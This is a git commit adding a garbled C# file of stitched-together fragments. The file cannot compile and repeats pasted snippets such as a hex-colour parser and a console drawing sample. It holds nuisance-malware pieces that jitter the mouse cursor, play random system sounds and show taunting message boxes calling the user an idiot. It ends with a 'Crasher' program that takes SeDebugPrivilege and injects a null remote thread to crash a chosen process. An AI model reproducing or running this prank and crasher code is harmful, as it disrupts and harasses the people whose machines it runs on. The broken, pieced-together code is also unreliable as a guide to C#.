1c3ea557b9436a3e9278eee22a8fa6b065517193
lagalapizza_1011 <52937131+SH0-ahacker@users.noreply.github.com>
2019-08-25 20:55:25 -0300

    Create .cs

---
+++ .cs
@@ -0,0 +1,427 @@
+using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Threading;
+using System.Media;
+using System.IO;
+using System.Reflection;
+public unsafe struct Node
+{
+    public int Value;
+    public Node* Left;
+    public Node* Right;
+}
+{
+                Thread.Sleep(100);
+            }
+{
+                int MoveX = _random.Next(20);
+                int MoveY = _random.Next(20);
+                Cursor.Position = new System.Drawing.Point(
+                    Cursor.Position.X + (MoveX - 10),
+                    Cursor.Position.Y + (MoveY - 10));
+                Thread.Sleep(50);
+            }
+            
+            {
+                int res = _random.Next(4);
+                switch (res)
+                {
+                    case 0:
+                        SystemSounds.Beep.Play();
+                        break;
+                    case 1:
+                        SystemSounds.Asterisk.Play();
+                        break;
+                    case 2:
+                        SystemSounds.Exclamation.Play();
+                        break;
+                    case 3:
+                        SystemSounds.Hand.Play();
+                        break;
+                    case 4:
+                        SystemSounds.Question.Play();
+                        break;
+                }
+                
+         MessageBox.Show("Made by lagalapizza.");   
+         MessageBox.Show("idiot.");
+         MessageBox.Show("hahahah.");
+         if (hexColor.IndexOf('#') != -1)
+        hexColor = hexColor.Replace("#", "");
+ 
+    byte red = 0;
+    byte green = 0;
+    byte blue = 0;
+ 
+    if (hexColor.Length == 8)
+    {
+        //We need to remove the preceding FF
+        hexColor = hexColor.Substring(2);
+    }
+ 
+    if (hexColor.Length == 6)
+    {
+        //#RRGGBB
+        red = byte.Parse(hexColor.Substring(0, 2), NumberStyles.AllowHexSpecifier);
+        green = byte.Parse(hexColor.Substring(2, 2), NumberStyles.AllowHexSpecifier);
+        blue = byte.Parse(hexColor.Substring(4, 2), NumberStyles.AllowHexSpecifier);
+    }
+    else if (hexColor.Length == 3)
+    {
+        //#RGB
+        red = byte.Parse(hexColor[0].ToString() + hexColor[0].ToString(), NumberStyles.AllowHexSpecifier);
+        green = byte.Parse(hexColor[1].ToString() + hexColor[1].ToString(), NumberStyles.AllowHexSpecifier);
+        blue = byte.Parse(hexColor[2].ToString() + hexColor[2].ToString(), NumberStyles.AllowHexSpecifier);
+    }
+ 
+    return Color.FromRgb(red, green, blue);
+
+if (hexColor.IndexOf('#') != -1)
+        hexColor = hexColor.Replace("#", "");
+ 
+    byte red = 0;
+    byte green = 0;
+    byte blue = 0;
+ 
+    if (hexColor.Length == 8)
+    {
+        //We need to remove the preceding FF
+        hexColor = hexColor.Substring(2);
+    }
+ 
+    if (hexColor.Length == 6)
+    {
+        //#RRGGBB
+        red = byte.Parse(hexColor.Substring(0, 2), NumberStyles.AllowHexSpecifier);
+        green = byte.Parse(hexColor.Substring(2, 2), NumberStyles.AllowHexSpecifier);
+        blue = byte.Parse(hexColor.Substring(4, 2), NumberStyles.AllowHexSpecifier);
+    }
+    else if (hexColor.Length == 3)
+    {
+        //#RGB
+        red = byte.Parse(hexColor[0].ToString() + hexColor[0].ToString(), NumberStyles.AllowHexSpecifier);
+        green = byte.Parse(hexColor[1].ToString() + hexColor[1].ToString(), NumberStyles.AllowHexSpecifier);
+        blue = byte.Parse(hexColor[2].ToString() + hexColor[2].ToString(), NumberStyles.AllowHexSpecifier);
+    }
+ 
+    return Color.FromRgb(red, green, blue);
+
+if (hexColor.IndexOf('#') != -1)
+        hexColor = hexColor.Replace("#", "");
+ 
+    byte red = 0;
+    byte green = 0;
+    byte blue = 0;
+ 
+    if (hexColor.Length == 8)
+    {
+        //We need to remove the preceding FF
+        hexColor = hexColor.Substring(2);
+    }
+ 
+    if (hexColor.Length == 6)
+    {
+        //#RRGGBB
+        red = byte.Parse(hexColor.Substring(0, 2), NumberStyles.AllowHexSpecifier);
+        green = byte.Parse(hexColor.Substring(2, 2), NumberStyles.AllowHexSpecifier);
+        blue = byte.Parse(hexColor.Substring(4, 2), NumberStyles.AllowHexSpecifier);
+    }
+    else if (hexColor.Length == 3)
+    {
+        //#RGB
+        red = byte.Parse(hexColor[0].ToString() + hexColor[0].ToString(), NumberStyles.AllowHexSpecifier);
+        green = byte.Parse(hexColor[1].ToString() + hexColor[1].ToString(), NumberStyles.AllowHexSpecifier);
+        blue = byte.Parse(hexColor[2].ToString() + hexColor[2].ToString(), NumberStyles.AllowHexSpecifier);
+    }
+ 
+    return Color.FromRgb(red, green, blue);
+
+if (hexColor.IndexOf('#') != -1)
+        hexColor = hexColor.Replace("#", "");
+ 
+    byte red = 0;
+    byte green = 0;
+    byte blue = 0;
+ 
+    if (hexColor.Length == 8)
+    {
+        //We need to remove the preceding FF
+        hexColor = hexColor.Substring(2);
+    }
+ 
+    if (hexColor.Length == 6)
+    {
+        //#RRGGBB
+        red = byte.Parse(hexColor.Substring(0, 2), NumberStyles.AllowHexSpecifier);
+        green = byte.Parse(hexColor.Substring(2, 2), NumberStyles.AllowHexSpecifier);
+        blue = byte.Parse(hexColor.Substring(4, 2), NumberStyles.AllowHexSpecifier);
+    }
+    else if (hexColor.Length == 3)
+    {
+        //#RGB
+        red = byte.Parse(hexColor[0].ToString() + hexColor[0].ToString(), NumberStyles.AllowHexSpecifier);
+        green = byte.Parse(hexColor[1].ToString() + hexColor[1].ToString(), NumberStyles.AllowHexSpecifier);
+        blue = byte.Parse(hexColor[2].ToString() + hexColor[2].ToString(), NumberStyles.AllowHexSpecifier);
+    }
+ 
+    return Color.FromRgb(red, green, blue);
+
+MessageBox.Show("hahahah.");
+MessageBox.Show("hahahah.");
+MessageBox.Show("hahahah.");
+MessageBox.Show("hahahah.");
+MessageBox.Show("hahahah.");
+MessageBox.Show("hahahah.");
+MessageBox.Show("hahahah.");
+MessageBox.Show("hahahah.");
+MessageBox.Show("hahahah.");
+MessageBox.Show("hahahah.");
+MessageBox.Show("hahahah.");
+MessageBox.Show("hahahah.");
+{
+                int res = _random.Next(4);
+                switch (res)
+                {
+                    case 0:
+                        SystemSounds.Beep.Play();
+                        break;
+                    case 1:
+                        SystemSounds.Asterisk.Play();
+                        break;
+                    case 2:
+                        SystemSounds.Exclamation.Play();
+                        break;
+                    case 3:
+                        SystemSounds.Hand.Play();
+                        break;
+                    case 4:
+                        SystemSounds.Question.Play();
+                        break;
+                }
+                {
+                int res = _random.Next(4);
+                switch (res)
+                {
+                    case 0:
+                        SystemSounds.Beep.Play();
+                        break;
+                    case 1:
+                        SystemSounds.Asterisk.Play();
+                        break;
+                    case 2:
+                        SystemSounds.Exclamation.Play();
+                        break;
+                    case 3:
+                        SystemSounds.Hand.Play();
+                        break;
+                    case 4:
+                        SystemSounds.Question.Play();
+                        break;
+                }
+                {
+                int res = _random.Next(4);
+                switch (res)
+                {
+                    case 0:
+                        SystemSounds.Beep.Play();
+                        break;
+                    case 1:
+                        SystemSounds.Asterisk.Play();
+                        break;
+                    case 2:
+                        SystemSounds.Exclamation.Play();
+                        break;
+                    case 3:
+                        SystemSounds.Hand.Play();
+                        break;
+                    case 4:
+                        SystemSounds.Question.Play();
+                        break;
+                }
+                {
+                int res = _random.Next(4);
+                switch (res)
+                {
+                    case 0:
+                        SystemSounds.Beep.Play();
+                        break;
+                    case 1:
+                        SystemSounds.Asterisk.Play();
+                        break;
+                    case 2:
+                        SystemSounds.Exclamation.Play();
+                        break;
+                    case 3:
+                        SystemSounds.Hand.Play();
+                        break;
+                    case 4:
+                        SystemSounds.Question.Play();
+                        break;
+                }
+                {
+                int res = _random.Next(4);
+                switch (res)
+                {
+                    case 0:
+                        SystemSounds.Beep.Play();
+                        break;
+                    case 1:
+                        SystemSounds.Asterisk.Play();
+                        break;
+                    case 2:
+                        SystemSounds.Exclamation.Play();
+                        break;
+                    case 3:
+                        SystemSounds.Hand.Play();
+                        break;
+                    case 4:
+                        SystemSounds.Question.Play();
+                        break;
+                }
+                pointer_indirection_expression
+    : '*' unary_expression
+    ;
+    public static void SetCursorPosition (int 10, int 9);
+    class Sample 
+{
+    protected static int origRow;
+    protected static int origCol;
+
+    protected static void WriteAt(string s, int x, int y)
+    {
+    try
+        {
+        Console.SetCursorPosition(origCol+x, origRow+y);
+        Console.Write(s);
+        }
+    catch (ArgumentOutOfRangeException e)
+        {
+        Console.Clear();
+        Console.WriteLine(e.Message);
+        }
+    }
+
+    public static void Main() 
+    {
+// Clear the screen, then save the top and left coordinates.
+    Console.Clear();
+    origRow = Console.CursorTop;
+    origCol = Console.CursorLeft;
+
+// Draw the left side of a 5x5 rectangle, from top to bottom.
+    WriteAt("+", 0, 0);
+    WriteAt("|", 0, 1);
+    WriteAt("|", 0, 2);
+    WriteAt("|", 0, 3);
+    WriteAt("+", 0, 4);
+
+// Draw the bottom side, from left to right.
+    WriteAt("-", 1, 4); // shortcut: WriteAt("---", 1, 4)
+    WriteAt("-", 2, 4); // ...
+    WriteAt("-", 3, 4); // ...
+    WriteAt("+", 4, 4);
+
+// Draw the right side, from bottom to top.
+    WriteAt("|", 4, 3);
+    WriteAt("|", 4, 2);
+    WriteAt("|", 4, 1);
+    WriteAt("+", 4, 0);
+
+// Draw the top side, from right to left.
+    WriteAt("-", 3, 0); // shortcut: WriteAt("---", 1, 0)
+    WriteAt("-", 2, 0); // ...
+    WriteAt("-", 1, 0); // ...
+//
+    WriteAt("All done!", 0, 6);
+    Console.WriteLine();
+    }
+}
+/*
+This example produces the following results:
+
++---+
+|   |
+|   |
+|   |
++---+
+
+All done!
+
+*/
+public static void SetWindowPosition (int 1, int 1);
+public static void SetWindowPosition (int 2, int 1);
+public static void SetWindowPosition (int 1, int 2);
+public static void SetWindowPosition (int 10, int 1);
+public static void SetWindowPosition (int 0, int 0);
+public static void SetWindowPosition (int 1, int 1);
+Console.WriteLine("4 5 6"); Console.WriteLine("1 2 3");
+[System.Serializable]
+public enum DarkMagenta
+namespace Crasher
+{
+    static class Crasher
+    {
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern IntPtr CreateRemoteThread(IntPtr hProcess,
+                IntPtr lpThreadAttributes, uint dwStackSize, IntPtr
+                lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
+
+        [DllImport("ntdll.dll", SetLastError = true)]
+        public static extern IntPtr RtlAdjustPrivilege(int Privilege, bool Enable,
+                bool IsThreadPrivilege, out bool PreviousValue);
+
+        static void Main()
+        {
+            string[] args = Environment.GetCommandLineArgs();
+
+            if (args.Length != 2)
+                Environment.Exit(-1);
+
+            int pid;
+            if (!int.TryParse(args[1], out pid))
+                Environment.Exit(-2);
+
+            try
+            {
+                Process process = Process.GetProcessById(pid);
+
+                if (process.HasExited)
+                    Environment.Exit(1);
+
+                bool x;
+                RtlAdjustPrivilege(20 /* SeDebugPrivilege */, true, false, out x);
+
+                IntPtr hProcess = OpenProcess(2097151, false, process.Id);
+
+                if (hProcess.ToInt32() != 0)
+                {
+                    IntPtr ret = CreateRemoteThread(hProcess, IntPtr.Zero, 0,
+                        IntPtr.Zero /* Let it execute *0 => Access Violation */,
+                        IntPtr.Zero, 0, new IntPtr());
+
+                    if (ret.ToInt32() != 0)
+                        Environment.Exit(0);
+                    else
+                        Environment.Exit(0x8000000 | Marshal.GetLastWin32Error());
+                        
+                } else
+                    Environment.Exit(0x4000000 | Marshal.GetLastWin32Error());
+                   
+            }
+            catch (Exception)
+            {
+                Environment.Exit(2);
+            }
+        }
+    }
+}
